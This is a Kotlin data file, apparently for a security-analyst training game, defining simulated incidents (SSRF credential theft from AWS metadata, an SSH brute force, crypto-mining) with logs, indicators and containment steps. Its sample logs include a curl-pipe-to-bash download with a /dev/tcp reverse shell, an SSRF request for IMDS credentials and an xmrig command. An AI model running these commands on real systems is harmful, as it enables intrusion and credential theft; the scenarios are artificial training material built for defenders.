                    timestamp = "2026-08-27T10:15:45Z",
                    source = "Sysmon",
                    eventName = "Event ID 11 (FileCreate)",
                    actor = "CORP\\sarah.jenkins",
                    severity = IncidentSeverity.HIGH,
                    rawPayload = "{\"EventID\":11,\"UtcTime\":\"2026-08-27 10:15:45.331\",\"Image\":\"C:\\\\Windows\\\\System32\\\\bitsadmin.exe\",\"TargetFilename\":\"C:\\\\Users\\\\Public\\\\svchost_update.exe\",\"CreationUtcTime\":\"2026-08-27 10:15:45.330\",\"Hashes\":\"SHA256=E3B0C44298FC1C149AFBF4C8996FB92427AE41E4649B934CA495991B7852B855\"}",
                    parsedFields = mapOf("EventID" to "11", "DroppedFile" to "C:\\Users\\Public\\svchost_update.exe", "SHA256" to "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"),
                    isMalicious = true,
                    attackPhase = "Persistence"
                ),
                LogEvent(
                    id = "wlog-3",
                    timestamp = "2026-08-27T10:16:10Z",
                    source = "Sysmon",
                    eventName = "Event ID 10 (ProcessAccess)",
                    actor = "NT AUTHORITY\\SYSTEM",
                    severity = IncidentSeverity.CRITICAL,
                    rawPayload = "{\"EventID\":10,\"UtcTime\":\"2026-08-27 10:16:10.890\",\"SourceImage\":\"C:\\\\Users\\\\Public\\\\svchost_update.exe\",\"TargetImage\":\"C:\\\\Windows\\\\System32\\\\lsass.exe\",\"GrantedAccess\":\"0x1010\",\"CallTrace\":\"C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+9fb84|C:\\\\Windows\\\\System32\\\\KERNELBASE.dll+2c34e\"}",
                    parsedFields = mapOf("EventID" to "10", "SourceImage" to "svchost_update.exe", "TargetImage" to "lsass.exe", "GrantedAccess" to "0x1010 (PROCESS_VM_READ | PROCESS_QUERY_INFORMATION)"),
                    isMalicious = true,
                    attackPhase = "Credential Access"
                ),
                LogEvent(
                    id = "wlog-4",
                    timestamp = "2026-08-27T10:17:00Z",
                    source = "Sysmon",
                    eventName = "Event ID 3 (NetworkConnect)",
                    actor = "CORP\\sarah.jenkins",
                    sourceIp = "10.20.4.88",
                    destinationIp = "91.132.145.88",
                    severity = IncidentSeverity.HIGH,
                    rawPayload = "{\"EventID\":3,\"UtcTime\":\"2026-08-27 10:17:00.120\",\"Image\":\"C:\\\\Windows\\\\System32\\\\svchost.exe\",\"SourceIp\":\"10.20.4.88\",\"SourcePort\":49821,\"DestinationIp\":\"91.132.145.88\",\"DestinationPort\":8443,\"Protocol\":\"tcp\",\"DestinationHostname\":\"cdn-update-cloud.net\"}",
                    parsedFields = mapOf("EventID" to "3", "Image" to "svchost.exe", "DestinationIp" to "91.132.145.88", "DestinationPort" to "8443", "Protocol" to "TCP"),
                    isMalicious = true,
                    attackPhase = "Command and Control"
                )
            )
        )
    }

    private fun createCloudSsrfImdsIncident(): Incident {
        return Incident(
            id = "INC-CLOUD-7711",
            title = "EC2 SSRF to IMDSv1 Credential Theft & RDS Database Exfiltration",
            category = IncidentCategory.MULTI_STAGE,
            difficulty = DifficultyLevel.EXPERT,
            initialSeverity = IncidentSeverity.CRITICAL,
            targetOrganization = "OmniCloud Commerce Platform",
            assetScope = "EC2: i-0e4b81c201a (AppTier-Web), RDS: rds-prod-customer-orders",
            alertHeadline = "WAF SSRF Signature Trigger + CloudTrail AssumeRole Anomaly from Outside AWS ASN",
            alertSource = "AWS WAF / CloudTrail / GuardDuty",
            alertDescription = "Adversary exploited a Server-Side Request Forgery vulnerability on public web app, queried AWS IMDSv1 (169.254.169.254) to steal temporary instance profile tokens for 'EC2AppRole', and used them from external IP 45.154.255.89 to create and share an RDS snapshot with an unauthorized account.",
            rootCauseSummary = "Web application running on EC2 instance i-0e4b81c201a without IMDSv2 enforcement allowed attacker at 45.154.255.89 to extract STS credentials for role 'EC2AppRole'. The attacker used these stolen credentials to execute rds:CreateDBSnapshot and rds:ModifyDBSnapshotAttribute, exfiltrating the entire database to AWS Account 771928391823.",
            hints = listOf(
                "Look at the Web server access logs for requests querying 169.254.169.254 via URL parameters.",
                "Check CloudTrail logs for the role 'EC2AppRole' invoked from outside the VPC CIDR range.",
                "Identify what RDS snapshot was modified and what AWS Account ID was granted restore permissions."
            ),
            recommendedLearningTopics = listOf("IMDSv1 vs IMDSv2 Security Architecture", "SSRF to Cloud Credential Pivoting", "RDS Snapshot Sharing & Exfiltration Vectors"),
            xpReward = 750,
            correctIocs = listOf(
                IocItem(id = "ssrf-ioc-1", type = IocType.IP_ADDRESS, value = "45.154.255.89", contextNote = "Attacker IP conducting SSRF and API calls", isTrueIoc = true),
                IocItem(id = "ssrf-ioc-2", type = IocType.ROLE_ARN, value = "arn:aws:iam::489201948210:role/EC2AppRole", contextNote = "Compromised EC2 Instance Role", isTrueIoc = true),
                IocItem(id = "ssrf-ioc-3", type = IocType.ROLE_ARN, value = "771928391823", contextNote = "Attacker's external AWS Account receiving snapshot", isTrueIoc = true)
            ),
            correctMitreTechniques = listOf(
                MitreTechnique(
                    id = "T1190",
                    name = "Exploit Public-Facing Application: SSRF",
                    tactic = "Initial Access",
                    description = "Adversaries may exploit vulnerabilities in Internet-facing applications to execute commands or reach internal metadata services.",
                    cloudDetectionQuery = "source:WAF AND (request:169.254.169.254 OR request:latest/meta-data)",
                    mitigation = "Enforce IMDSv2 (HttpTokens=required, HttpPutResponseHopLimit=1) across all EC2 instances."
                ),
                MitreTechnique(
                    id = "T1552.005",
                    name = "Unsecured Credentials: Cloud Instance Metadata Service",
                    tactic = "Credential Access",
                    description = "Adversaries may query the Instance Metadata Service (IMDS) to retrieve temporary cloud credentials.",
                    cloudDetectionQuery = "eventName:AssumeRoleWithWebIdentity OR (userIdentity.sessionContext:* AND sourceIPAddress NOT IN (VpcCIDR))",
                    mitigation = "Require IMDSv2 and disable IMDS on instances that do not strictly require it."
                ),
                MitreTechnique(
                    id = "T1537",
                    name = "Transfer Data to Cloud Account",
                    tactic = "Exfiltration",
                    description = "Adversaries may transfer data or snapshots to another cloud account under their control.",
                    cloudDetectionQuery = "eventName:ModifyDBSnapshotAttribute AND requestParameters.valuesToAdd:*",
                    mitigation = "Use AWS SCPs to block sharing of RDS snapshots and EBS volumes outside the AWS Organization."
                )
            ),
            correctMilestones = listOf(
                TimelineMilestone(id = "sm-1", logId = "slog-1", timestamp = "2026-08-27T18:02:10Z", title = "SSRF Probe against IMDS", description = "Adversary probes /fetch-preview endpoint requesting http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2AppRole.", phase = "Initial Access", isCriticalStep = true),
                TimelineMilestone(id = "sm-2", logId = "slog-2", timestamp = "2026-08-27T18:04:40Z", title = "Stolen STS Token Usage from External ASN", description = "Adversary calls rds:DescribeDBInstances from 45.154.255.89 using stolen token.", phase = "Discovery", isCriticalStep = true),
                TimelineMilestone(id = "sm-3", logId = "slog-3", timestamp = "2026-08-27T18:07:15Z", title = "RDS Snapshot Created", description = "Adversary calls rds:CreateDBSnapshot on rds-prod-customer-orders.", phase = "Collection", isCriticalStep = true),
                TimelineMilestone(id = "sm-4", logId = "slog-4", timestamp = "2026-08-27T18:09:50Z", title = "Snapshot Shared with Attacker Account", description = "Adversary shares snapshot with external AWS Account 771928391823 via ModifyDBSnapshotAttribute.", phase = "Exfiltration", isCriticalStep = true)
            ),
            availableContainmentActions = listOf(
                ContainmentAction(id = "ssrf-c1", title = "Enforce IMDSv2 (HttpTokens=required) on EC2 instance i-0e4b81c201a", category = "Infrastructure", description = "Disallow insecure IMDSv1 calls, preventing SSRF credential theft.", isRecommended = true),
                ContainmentAction(id = "ssrf-c2", title = "Revoke All Active STS Sessions for EC2AppRole & Update IAM Role Policy", category = "IAM", description = "Invalidate stolen temporary credentials immediately.", isRecommended = true),
                ContainmentAction(id = "ssrf-c3", title = "Revert RDS Snapshot Permissions & Remove Account 771928391823", category = "Database", description = "Cut off external adversary account from restoring the exfiltrated database snapshot.", isRecommended = true),
                ContainmentAction(id = "ssrf-c4", title = "Patch Vulnerable Web Application SSRF Endpoint /fetch-preview", category = "Application", description = "Sanitize and whitelist permitted destination URLs in application code.", isRecommended = true)
            ),
            correctContainmentIds = listOf("ssrf-c1", "ssrf-c2", "ssrf-c3", "ssrf-c4"),
            logs = listOf(
                LogEvent(
                    id = "slog-1",
                    timestamp = "2026-08-27T18:02:10Z",
                    source = "Web WAF / Nginx",
                    eventName = "HTTP GET /fetch-preview",
                    actor = "Anonymous (Adversary)",
                    sourceIp = "45.154.255.89",
                    destinationIp = "10.0.2.14",
                    severity = IncidentSeverity.HIGH,
                    rawPayload = "{\"timestamp\":\"2026-08-27T18:02:10Z\",\"client_ip\":\"45.154.255.89\",\"method\":\"GET\",\"uri\":\"/api/v1/fetch-preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2AppRole\",\"status\":200,\"bytes_sent\":1042,\"user_agent\":\"sqlmap/1.7.2#dev\"}",
                    parsedFields = mapOf("client_ip" to "45.154.255.89", "target_url" to "http://169.254.169.254/.../EC2AppRole", "status" to "200"),
                    isMalicious = true,
                    attackPhase = "Initial Access"
                ),
                LogEvent(
                    id = "slog-2",
                    timestamp = "2026-08-27T18:04:40Z",
                    source = "CloudTrail",
                    eventName = "DescribeDBInstances",
                    actor = "arn:aws:sts::489201948210:assumed-role/EC2AppRole/i-0e4b81c201a",
                    sourceIp = "45.154.255.89",
                    severity = IncidentSeverity.MEDIUM,
                    rawPayload = "{\"eventTime\":\"2026-08-27T18:04:40Z\",\"eventSource\":\"rds.amazonaws.com\",\"eventName\":\"DescribeDBInstances\",\"userIdentity\":{\"type\":\"AssumedRole\",\"arn\":\"arn:aws:sts::489201948210:assumed-role/EC2AppRole/i-0e4b81c201a\"},\"sourceIPAddress\":\"45.154.255.89\",\"userAgent\":\"aws-cli/2.11.0\"}",
                    parsedFields = mapOf("eventSource" to "rds.amazonaws.com", "role" to "EC2AppRole", "sourceIp" to "45.154.255.89"),
                    isMalicious = true,
                    attackPhase = "Discovery"
                ),
                LogEvent(
                    id = "slog-3",
                    timestamp = "2026-08-27T18:07:15Z",
                    source = "CloudTrail",
                    eventName = "CreateDBSnapshot",
                    actor = "arn:aws:sts::489201948210:assumed-role/EC2AppRole/i-0e4b81c201a",
                    sourceIp = "45.154.255.89",
                    severity = IncidentSeverity.HIGH,
                    rawPayload = "{\"eventTime\":\"2026-08-27T18:07:15Z\",\"eventSource\":\"rds.amazonaws.com\",\"eventName\":\"CreateDBSnapshot\",\"requestParameters\":{\"dBInstanceIdentifier\":\"rds-prod-customer-orders\",\"dBSnapshotIdentifier\":\"snap-temp-backup-2026\"},\"sourceIPAddress\":\"45.154.255.89\"}",
                    parsedFields = mapOf("eventSource" to "rds.amazonaws.com", "dBInstance" to "rds-prod-customer-orders", "snapshotId" to "snap-temp-backup-2026"),
                    isMalicious = true,
                    attackPhase = "Collection"
                ),
                LogEvent(
                    id = "slog-4",
                    timestamp = "2026-08-27T18:09:50Z",
                    source = "CloudTrail",
                    eventName = "ModifyDBSnapshotAttribute",
                    actor = "arn:aws:sts::489201948210:assumed-role/EC2AppRole/i-0e4b81c201a",
                    sourceIp = "45.154.255.89",
                    severity = IncidentSeverity.CRITICAL,
                    rawPayload = "{\"eventTime\":\"2026-08-27T18:09:50Z\",\"eventSource\":\"rds.amazonaws.com\",\"eventName\":\"ModifyDBSnapshotAttribute\",\"requestParameters\":{\"dBSnapshotIdentifier\":\"snap-temp-backup-2026\",\"attributeName\":\"restore\",\"valuesToAdd\":[\"771928391823\"]},\"sourceIPAddress\":\"45.154.255.89\"}",
                    parsedFields = mapOf("eventSource" to "rds.amazonaws.com", "attribute" to "restore", "sharedWithAccount" to "771928391823", "sourceIp" to "45.154.255.89"),
                    isMalicious = true,
                    attackPhase = "Exfiltration"
                )
            )
        )
    }

    private fun createLinuxSshCompromiseIncident(): Incident {
        return Incident(
            id = "INC-LNX-3318",
            title = "Linux Server Compromise, Persistence via Systemd & Reverse Shell",
            category = IncidentCategory.LINUX_AUDITD,
            difficulty = DifficultyLevel.INTERMEDIATE,
            initialSeverity = IncidentSeverity.HIGH,
            targetOrganization = "HyperScale Container Logistics",
            assetScope = "Host: srv-k8s-worker02 (IP: 10.0.12.44)",
            alertHeadline = "SSH Password Spray Success + Outbound Beaconing on TCP Port 4444",
            alertSource = "Linux auditd / auth.log / Zeek IDS",
            alertDescription = "Over 1,200 failed SSH authentication attempts from IP 103.251.167.20 followed by successful password login for service account 'deployer'. Subsequently, a bash reverse shell was launched and a persistent systemd service was installed.",
            rootCauseSummary = "Weak credentials on the 'deployer' account allowed an attacker at 103.251.167.20 to brute-force SSH access. The attacker downloaded payload script p.sh, established a reverse shell back to C2 host 45.33.32.156:4444, and created a persistence daemon '/etc/systemd/system/cloud-sync-daemon.service'.",
            hints = listOf(
                "Inspect /var/log/auth.log for failed password bursts and the subsequent successful session.",
                "Check auditd EXECVE logs for commands executed right after the interactive SSH session opened.",
                "Identify what systemd service was enabled and what binary it points to."
            ),
            recommendedLearningTopics = listOf("Linux auth.log & auditd Log Triage", "Linux Persistence via Systemd, Cron & SSH Keys", "Reverse Shell Network Analysis"),
            xpReward = 500,
            correctIocs = listOf(
                IocItem(id = "lnx-ioc-1", type = IocType.IP_ADDRESS, value = "103.251.167.20", contextNote = "Adversary SSH Brute Force IP", isTrueIoc = true),
                IocItem(id = "lnx-ioc-2", type = IocType.IP_ADDRESS, value = "45.33.32.156", contextNote = "Reverse Shell C2 IP (Port 4444)", isTrueIoc = true),
                IocItem(id = "lnx-ioc-3", type = IocType.PROCESS_NAME, value = "/usr/local/bin/.kworker", contextNote = "Adversary Trojan Binary", isTrueIoc = true)
            ),
            correctMitreTechniques = listOf(
                MitreTechnique(
                    id = "T1110.001",
                    name = "Brute Force: Password Guessing",
                    tactic = "Initial Access",
                    description = "Adversaries may systematically guess passwords to obtain valid credentials.",
                    cloudDetectionQuery = "source:auth.log AND \"Failed password for\" AND count > 50",
                    mitigation = "Disable SSH password authentication, enforce Ed25519 SSH keys, and deploy Fail2ban."
                ),
                MitreTechnique(
                    id = "T1053.003",
                    name = "Scheduled Task/Job: Systemd Service",
                    tactic = "Persistence",
                    description = "Adversaries may establish persistence by creating systemd units.",
                    cloudDetectionQuery = "source:auditd AND (path:\"/etc/systemd/system/*\" OR type:SERVICE_START)",
                    mitigation = "Restrict write access to /etc/systemd/system and monitor systemctl daemon-reload events."
                ),
                MitreTechnique(
                    id = "T1059.004",
                    name = "Command and Scripting Interpreter: Unix Shell",
                    tactic = "Execution",
                    description = "Adversaries may abuse Unix shells to execute commands and launch interactive sessions.",
                    cloudDetectionQuery = "source:auditd AND comm:bash AND (a0:\"/bin/sh\" OR a0:\"curl\")",
                    mitigation = "Deploy Falco or Auditd rules alerting on interactive shell spawns from web/service users."
                )
            ),
            correctMilestones = listOf(
                TimelineMilestone(id = "lm-1", logId = "llog-1", timestamp = "2026-08-27T08:12:00Z", title = "SSH Password Spraying", description = "Adversary attempts 1,200+ passwords from 103.251.167.20.", phase = "Initial Access", isCriticalStep = false),
                TimelineMilestone(id = "lm-2", logId = "llog-2", timestamp = "2026-08-27T08:14:10Z", title = "Successful Authentication", description = "Accepted password for deployer from 103.251.167.20 port 51290 ssh2.", phase = "Initial Access", isCriticalStep = true),
                TimelineMilestone(id = "lm-3", logId = "llog-3", timestamp = "2026-08-27T08:15:30Z", title = "Malicious Payload Execution", description = "curl http://raw.githubusercontent-malware.org/x/p.sh | bash executed.", phase = "Execution", isCriticalStep = true),
                TimelineMilestone(id = "lm-4", logId = "llog-4", timestamp = "2026-08-27T08:16:45Z", title = "Persistence Service Installed", description = "Created /etc/systemd/system/cloud-sync-daemon.service pointing to /usr/local/bin/.kworker.", phase = "Persistence", isCriticalStep = true)
            ),
            availableContainmentActions = listOf(
                ContainmentAction(id = "lnx-c1", title = "Block Attacker IPs (103.251.167.20, 45.33.32.156) at Cloud Security Group / IPTables", category = "Network", description = "Drop all packets from and to the adversary infrastructure.", isRecommended = true),
                ContainmentAction(id = "lnx-c2", title = "Disable Password Auth on SSH & Revoke deployer account credentials", category = "Identity", description = "Lock deployer password in /etc/shadow and remove unauthorized ~/.ssh/authorized_keys entries.", isRecommended = true),
                ContainmentAction(id = "lnx-c3", title = "Stop and Disable cloud-sync-daemon.service & Delete /usr/local/bin/.kworker", category = "Endpoint", description = "Remove systemd persistence unit and kill running background C2 daemon.", isRecommended = true)
            ),
            correctContainmentIds = listOf("lnx-c1", "lnx-c2", "lnx-c3"),
            logs = listOf(
                LogEvent(
                    id = "llog-1",
                    timestamp = "2026-08-27T08:12:00Z",
                    source = "Linux auth.log",
                    eventName = "Failed password for invalid user root",
                    actor = "Adversary",
                    sourceIp = "103.251.167.20",
                    severity = IncidentSeverity.LOW,
                    rawPayload = "Aug 27 08:12:00 srv-k8s-worker02 sshd[49102]: Failed password for invalid user root from 103.251.167.20 port 50811 ssh2",
                    parsedFields = mapOf("service" to "sshd", "sourceIp" to "103.251.167.20", "status" to "FAILED_AUTH"),
                    isMalicious = true,
                    attackPhase = "Initial Access"
                ),
                LogEvent(
                    id = "llog-2",
                    timestamp = "2026-08-27T08:14:10Z",
                    source = "Linux auth.log",
                    eventName = "Accepted password for deployer",
                    actor = "deployer",
                    sourceIp = "103.251.167.20",
                    severity = IncidentSeverity.HIGH,
                    rawPayload = "Aug 27 08:14:10 srv-k8s-worker02 sshd[49890]: Accepted password for deployer from 103.251.167.20 port 51290 ssh2; pam_unix(sshd:session): session opened for user deployer by (uid=0)",
                    parsedFields = mapOf("service" to "sshd", "user" to "deployer", "sourceIp" to "103.251.167.20", "status" to "SUCCESS_LOGIN"),
                    isMalicious = true,
                    attackPhase = "Initial Access"
                ),
                LogEvent(
                    id = "llog-3",
                    timestamp = "2026-08-27T08:15:30Z",
                    source = "Linux auditd",
                    eventName = "EXECVE",
                    actor = "deployer",
                    severity = IncidentSeverity.CRITICAL,
                    rawPayload = "type=EXECVE msg=audit(1724746530.104:8812): argc=3 a0=\"curl\" a1=\"-fsSL\" a2=\"https://raw.githubusercontent-malware.org/x/p.sh\" | bash -i >& /dev/tcp/45.33.32.156/4444 0>&1",
                    parsedFields = mapOf("comm" to "curl", "url" to "https://raw.githubusercontent-malware.org/x/p.sh", "pipe" to "bash reverse shell to 45.33.32.156:4444"),
                    isMalicious = true,
                    attackPhase = "Execution"
                ),
                LogEvent(
                    id = "llog-4",
                    timestamp = "2026-08-27T08:16:45Z",
                    source = "Linux auditd",
                    eventName = "PATH / FileWrite",
                    actor = "root",
                    severity = IncidentSeverity.HIGH,
                    rawPayload = "type=PATH msg=audit(1724746605.891:8824): item=0 name=\"/etc/systemd/system/cloud-sync-daemon.service\" inode=20981 dev=fc:01 mode=0100644 ouid=0 ogid=0 rdev=00:00 nametype=CREATE",
                    parsedFields = mapOf("createdPath" to "/etc/systemd/system/cloud-sync-daemon.service", "nametype" to "CREATE"),
                    isMalicious = true,
                    attackPhase = "Persistence"
                )
            )
        )
    }

    private fun createCryptoMiningIncident(): Incident {
        return Incident(
            id = "INC-EC2-1084",
            title = "EC2 Compromise & Unauthorized Crypto-Mining",
            category = IncidentCategory.EC2_GUARDDUTY,
            difficulty = DifficultyLevel.BEGINNER,
            initialSeverity = IncidentSeverity.HIGH,
            targetOrganization = "SaaS Matrix Enterprise",
            assetScope = "EC2 Instance: i-08a9f4e2b810d9 (c6i.4xlarge)",
            alertHeadline = "GuardDuty Finding: CryptoCurrency:EC2/BitcoinTool.B!DNS on instance i-08a9f4e2b810d9",
            alertSource = "AWS GuardDuty / VPC Flow Logs",
            alertDescription = "GuardDuty detected that EC2 instance i-08a9f4e2b810d9 is querying Monero mining pool domain 'xmr.pool-mine.org' and exhibiting 100% sustained CPU spikes across 16 vCPUs.",
            rootCauseSummary = "Unprotected exposed Redis server on TCP port 6379 allowed remote unauthenticated attacker to write a cron job executing xmrig miner from /tmp/.X11-unix/xmrig, routing mining shares to stratum+tcp://xmr.pool-mine.org:3333.",
            hints = listOf(
                "Check the security group rules on instance i-08a9f4e2b810d9. What ports are open to 0.0.0.0/0?",
                "Look at process execution logs in /tmp/.X11-unix/.",
                "Review the GuardDuty finding details for the mining pool domain and port."
            ),
            recommendedLearningTopics = listOf("GuardDuty Findings Triage", "EC2 Security Group Hardening", "Cloud Resource Hijacking & Crypto-Mining Containment"),
            xpReward = 400,
            correctIocs = listOf(
                IocItem(id = "cm-ioc-1", type = IocType.DOMAIN, value = "xmr.pool-mine.org", contextNote = "Monero Mining Pool Domain", isTrueIoc = true),
                IocItem(id = "cm-ioc-2", type = IocType.PROCESS_NAME, value = "/tmp/.X11-unix/xmrig", contextNote = "XMRig Mining Executable", isTrueIoc = true),
                IocItem(id = "cm-ioc-3", type = IocType.IP_ADDRESS, value = "51.89.144.201", contextNote = "Adversary Redis Exploiter IP", isTrueIoc = true)
            ),
            correctMitreTechniques = listOf(
                MitreTechnique(
                    id = "T1496",
                    name = "Resource Hijacking: Compute Resources",
                    tactic = "Impact",
                    description = "Adversaries may leverage cloud compute resources to mine digital currency.",
                    cloudDetectionQuery = "source:GuardDuty AND findingType:*CryptoCurrency*",
                    mitigation = "Deploy GuardDuty runtime monitoring and enforce automated remediation via EventBridge."
                ),
                MitreTechnique(
                    id = "T1190",
                    name = "Exploit Public-Facing Application: Redis Misconfiguration",
                    tactic = "Initial Access",
                    description = "Adversaries may exploit exposed databases or caches lacking authentication.",
                    cloudDetectionQuery = "source:VPCFlow AND (dstPort:6379 OR dstPort:9200) AND action:ACCEPT",
                    mitigation = "Never expose database ports (6379, 3306, 5432) to 0.0.0.0/0; place in private subnets."
                )
            ),
            correctMilestones = listOf(
                TimelineMilestone(id = "cm-m1", logId = "cmlog-1", timestamp = "2026-08-27T04:10:00Z", title = "Unauthenticated Redis Access", description = "Adversary at 51.89.144.201 connects to Redis on port 6379.", phase = "Initial Access", isCriticalStep = true),
                TimelineMilestone(id = "cm-m2", logId = "cmlog-2", timestamp = "2026-08-27T04:11:30Z", title = "Miner Payload Dropped to /tmp", description = "XMRig binary saved to /tmp/.X11-unix/xmrig.", phase = "Execution", isCriticalStep = true),
                TimelineMilestone(id = "cm-m3", logId = "cmlog-3", timestamp = "2026-08-27T04:12:00Z", title = "Mining Pool Stratum Traffic", description = "Outbound TCP connection to stratum+tcp://xmr.pool-mine.org:3333.", phase = "Impact", isCriticalStep = true)
            ),
            availableContainmentActions = listOf(
                ContainmentAction(id = "cm-c1", title = "Modify EC2 Security Group: Close Port 6379 to 0.0.0.0/0", category = "Network", description = "Restructure inbound security group to allow Redis access only from trusted application CIDRs.", isRecommended = true),
                ContainmentAction(id = "cm-c2", title = "Kill Mining Process (xmrig) & Delete /tmp/.X11-unix/ Directory", category = "Endpoint", description = "Terminate rogue CPU mining processes immediately.", isRecommended = true),
                ContainmentAction(id = "cm-c3", title = "Enable Redis Authentication (requirepass) & Bind to 127.0.0.1", category = "Configuration", description = "Harden Redis service config to prevent unauthenticated access.", isRecommended = true)
            ),
            correctContainmentIds = listOf("cm-c1", "cm-c2", "cm-c3"),
            logs = listOf(
                LogEvent(
                    id = "cmlog-1",
                    timestamp = "2026-08-27T04:10:00Z",
                    source = "VPC Flow Logs",
                    eventName = "ACCEPT TCP 6379",
                    actor = "Adversary",
                    sourceIp = "51.89.144.201",
                    destinationIp = "10.0.8.20",
                    severity = IncidentSeverity.MEDIUM,
                    rawPayload = "2 489201948210 eni-098a123 51.89.144.201 10.0.8.20 48120 6379 6 42 3840 1724731800 1724731860 ACCEPT OK",
                    parsedFields = mapOf("srcAddr" to "51.89.144.201", "dstPort" to "6379", "action" to "ACCEPT"),
                    isMalicious = true,
                    attackPhase = "Initial Access"
                ),
                LogEvent(
                    id = "cmlog-2",
                    timestamp = "2026-08-27T04:11:30Z",
                    source = "Linux auditd",
                    eventName = "EXECVE xmrig",
                    actor = "redis",
                    severity = IncidentSeverity.HIGH,
                    rawPayload = "type=EXECVE msg=audit(1724731890.201:4012): argc=4 a0=\"/tmp/.X11-unix/xmrig\" a1=\"-o\" a2=\"stratum+tcp://xmr.pool-mine.org:3333\" a3=\"-u\" a4=\"48291048201...\"",
                    parsedFields = mapOf("comm" to "xmrig", "path" to "/tmp/.X11-unix/xmrig", "pool" to "stratum+tcp://xmr.pool-mine.org:3333"),
                    isMalicious = true,
                    attackPhase = "Execution"
                ),
                LogEvent(
                    id = "cmlog-3",
                    timestamp = "2026-08-27T04:12:00Z",
                    source = "GuardDuty",
                    eventName = "CryptoCurrency:EC2/BitcoinTool.B!DNS",
                    actor = "i-08a9f4e2b810d9",
                    severity = IncidentSeverity.HIGH,
                    rawPayload = "{\"schemaVersion\":\"2.0\",\"accountId\":\"489201948210\",\"region\":\"us-east-1\",\"type\":\"CryptoCurrency:EC2/BitcoinTool.B!DNS\",\"resource\":{\"resourceType\":\"Instance\",\"instanceDetails\":{\"instanceId\":\"i-08a9f4e2b810d9\",\"instanceType\":\"c6i.4xlarge\"}},\"service\":{\"serviceName\":\"guardduty\",\"action\":{\"dnsRequestAction\":{\"domain\":\"xmr.pool-mine.org\"}}}}",
                    parsedFields = mapOf("findingType" to "CryptoCurrency:EC2/BitcoinTool.B!DNS", "domain" to "xmr.pool-mine.org", "instanceId" to "i-08a9f4e2b810d9"),
                    isMalicious = true,
                    attackPhase = "Impact"
                )
            )
        )
    }
}
